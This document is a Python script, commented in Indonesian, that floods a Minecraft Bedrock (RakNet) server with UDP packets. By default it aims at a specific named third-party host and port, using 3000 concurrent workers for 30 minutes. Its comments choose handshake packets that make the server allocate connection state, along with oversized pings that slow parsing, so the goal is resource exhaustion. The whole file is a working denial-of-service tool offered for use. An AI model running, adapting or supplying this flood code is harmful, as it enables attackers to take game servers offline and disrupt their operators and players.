# bedrock_load.py v2 — RakNet handshake-aware flood
# python 3.12 | stdlib only

import asyncio
import os
import random
import signal
import socket
import struct
import time

HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
PORT     = int(os.environ.get("PORT", "5073"))
DURATION = int(os.environ.get("DURATION", "1800"))
CONC     = int(os.environ.get("CONC", "3000"))
SOCKET_PER_WORKER = int(os.environ.get("SOCKETS", "2"))
SHARD    = os.environ.get("SHARD", "0")

MAGIC = bytes([
    0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
    0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
])

# protocol version RakNet — Bedrock 1.20.x
RAK_PROTO = 11


def pkt_ping():
    """0x01 unconnected ping — server balas 0x1c pong (MOTD + info)."""
    t = random.getrandbits(64)
    g = random.getrandbits(64)
    return b"\x01" + struct.pack(">Q", t) + MAGIC + struct.pack(">Q", g)


def pkt_oc1():
    """0x05 open connection request 1 — server alokasi state, balas 0x06."""
    # MTU size harus 18 byte minimum (RakNet spec) — isi dengan 0x00
    mtu = random.choice([1492, 1200, 576])
    mtu_field = b"\x00" * (mtu - 18)  # payload padding sampe MTU
    return b"\x05" + MAGIC + bytes([RAK_PROTO]) + mtu_field


def pkt_oc2(cookie: bytes = b"\x00\x00\x00\x00", secure: bool = False):
    """0x07 open connection request 2 — server balas 0x08 (encryption)."""
    server_addr = random.randbytes(7)   # 4 byte IP + 2 byte port (varian)
    mtu = struct.pack(">H", 1400)
    client_guid = struct.pack(">Q", random.getrandbits(64))
    return (b"\x07" + MAGIC + bytes([RAK_PROTO]) + server_addr
            + b"\x04\x00" + mtu + b"\x00" + client_guid)


def pkt_conn_req():
    """0x09 connection request — server accept kalo handshake bener."""
    guid = struct.pack(">Q", random.getrandbits(64))
    t = struct.pack(">Q", random.getrandbits(64))
    use_sec = b"\x00"
    return b"\x09" + MAGIC + guid + t + use_sec


def pkt_new_incom():
    """0x19 incompatible protocol."""
    return (b"\x19" + bytes([RAK_PROTO]) + MAGIC
            + struct.pack(">Q", random.getrandbits(64)))


def pkt_unconn_ping_oversized():
    """0x01 ping + padding 1400 byte — server parse payload lebih lama."""
    t = struct.pack(">Q", random.getrandbits(64))
    g = struct.pack(">Q", random.getrandbits(64))
    pad = os.urandom(random.randint(1200, 1400))
    return b"\x01" + t + MAGIC + g + pad


PACKET_POOL = [
    (pkt_ping, 0.30),
    (pkt_unconn_ping_oversized, 0.15),
    (pkt_oc1, 0.25),
    (pkt_oc2, 0.15),
    (pkt_conn_req, 0.10),
    (pkt_new_incom, 0.05),
]


def pick_pkt():
    r = random.random()
    cum = 0.0
    for builder, w in PACKET_POOL:
        cum += w
        if r <= cum:
            return builder()
    return pkt_ping()


class Stats:
    def __init__(self):
        self.sent = 0
        self.rx = 0
        self.rx_bytes = 0
        self.rx_pong = 0     # packet id 0x1c
        self.rx_reply1 = 0   # packet id 0x06
        self.rx_reply2 = 0   # packet id 0x08
        self.rx_other = 0
        self.fail = 0
        self.start = time.time()
        self.lock = asyncio.Lock()

    async def inc(self, sent=0, rx=0, b=0, fail=0, pid=None):
        async with self.lock:
            self.sent += sent
            self.rx += rx
            self.rx_bytes += b
            self.fail += fail
            if pid == 0x1c:
                self.rx_pong += 1
            elif pid == 0x06:
                self.rx_reply1 += 1
            elif pid == 0x08:
                self.rx_reply2 += 1
            elif pid is not None:
                self.rx_other += 1

    def snap(self) -> str:
        dt = max(1e-6, time.time() - self.start)
        ratio = (self.rx / self.sent * 100) if self.sent else 0.0
        return (f"[shard {SHARD}] sent={self.sent} rx={self.rx} "
                f"({ratio:.1f}%) pong={self.rx_pong} r1={self.rx_reply1} "
                f"r2={self.rx_reply2} oth={self.rx_other} "
                f"rxb={self.rx_bytes} fail={self.fail} "
                f"rate={self.sent / dt:.0f} pkt/s")


STATS = Stats()
STOP = asyncio.Event()


class BedrockWorker:
    def __init__(self):
        self.socks = []
        for _ in range(SOCKET_PER_WORKER):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
            s.setblocking(False)
            self.socks.append(s)
        self.rr = 0

    async def run(self):
        while not STOP.is_set():
            sock = self.socks[self.rr]
            self.rr = (self.rr + 1) % len(self.socks)
            try:
                for _ in range(6):
                    pkt = pick_pkt()
                    try:
                        sock.sendto(pkt, (HOST, PORT))
                        await STATS.inc(sent=1)
                    except OSError:
                        await STATS.inc(fail=1)
                for _ in range(10):
                    try:
                        data, _ = sock.recvfrom(4096)
                        pid = data[0] if data else None
                        await STATS.inc(rx=1, b=len(data), pid=pid)
                    except BlockingIOError:
                        break
                    except OSError:
                        break
                await asyncio.sleep(0)
            except Exception:
                await STATS.inc(fail=1)


async def reporter():
    while not STOP.is_set():
        await asyncio.sleep(3)
        print(STATS.snap(), flush=True)


async def main():
    print(f"[shard {SHARD}] UDP target={HOST}:{PORT} conc={CONC} "
          f"sockets/worker={SOCKET_PER_WORKER} dur={DURATION}s",
          flush=True)

    workers = [BedrockWorker() for _ in range(CONC)]
    tasks = [asyncio.create_task(w.run()) for w in workers]
    rep = asyncio.create_task(reporter())

    try:
        await asyncio.sleep(DURATION)
    finally:
        STOP.set()
        rep.cancel()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    print(STATS.snap(), flush=True)


def _sig(s, f):
    STOP.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
